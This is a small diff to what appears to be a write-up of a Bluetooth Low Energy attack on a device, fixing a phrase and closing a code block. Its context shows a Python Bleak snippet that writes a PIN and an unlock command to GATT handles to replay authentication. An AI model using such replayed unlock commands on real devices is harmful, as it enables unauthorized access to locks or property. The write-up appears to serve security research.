@@ -14,7 +14,7 @@ We split the attack into two distinct phases:
 2. **Active BLE Exploitation**  
    Use **Python + Bleak** to recreate the authentication and unlock commands and send them directly to the device. 
 
-   > needs BLE dongle 
+   > needs a BLE dongle 
 
 ---
 
@@ -47,3 +47,4 @@ Example:
 ```python
 await client.write_gatt_char("0x002d", b"0000", response=True)   # Send PIN
 await client.write_gatt_char("0x0037", b"\x01", response=True)   # Send unlock command
+```
